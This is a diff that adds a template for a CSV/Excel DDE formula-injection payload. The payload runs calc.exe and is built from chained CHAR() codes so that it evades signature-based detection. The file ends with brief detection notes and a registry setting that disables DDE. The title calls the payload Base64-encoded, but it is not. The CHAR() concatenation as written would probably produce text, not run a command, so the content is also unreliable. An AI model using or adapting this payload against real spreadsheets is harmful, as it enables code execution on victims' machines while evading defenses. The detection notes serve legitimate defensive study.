@@ -1,0 +1,28 @@
+# DDE Base64-Encoded Payload Template
+# 
+# DISCLAIMER: Educational purposes ONLY. Do not use without authorization.
+# This demonstrates DDE payload obfuscation using CHAR() function chaining.
+# PoC payload: calc.exe (Windows Calculator)
+#
+# Instead of: =CMD("cmd /c calc.exe","")
+# This uses CHAR() functions to build the string character by character
+# to evade signature-based detection
+#
+# In a real CSV, this would be placed in a cell value:
+# The formula below constructs: =CMD("cmd /c calc.exe","")
+# using character codes to avoid the literal string
+
+# Character codes for: cmd /c calc.exe
+# c=99, m=109, d=100, space=32, /=47, c=99, space=32, c=99, a=97, l=108, c=99, .=46, e=101, x=120, e=101
+
+# CSV cell value (educational reference - do not use for malicious purposes):
+# =CHAR(61)&CHAR(67)&CHAR(77)&CHAR(68)&CHAR(40)&CHAR(34)&CHAR(99)&CHAR(109)&CHAR(100)&CHAR(32)&CHAR(47)&CHAR(99)&CHAR(32)&CHAR(99)&CHAR(97)&CHAR(108)&CHAR(99)&CHAR(46)&CHAR(101)&CHAR(120)&CHAR(101)&CHAR(34)&CHAR(44)&CHAR(34)&CHAR(34)&CHAR(41)
+
+# Detection notes:
+# - Behavioral detection (Excel spawning cmd.exe) catches this
+# - CHAR() function chaining in CSV cells is a strong indicator
+# - Disable DDE to prevent all DDE variants
+
+# Mitigation:
+# - Group Policy: Disable DDE in Excel
+# - HKCU\Software\Microsoft\Office\<version>\Excel\Security\AllowDDE = 0
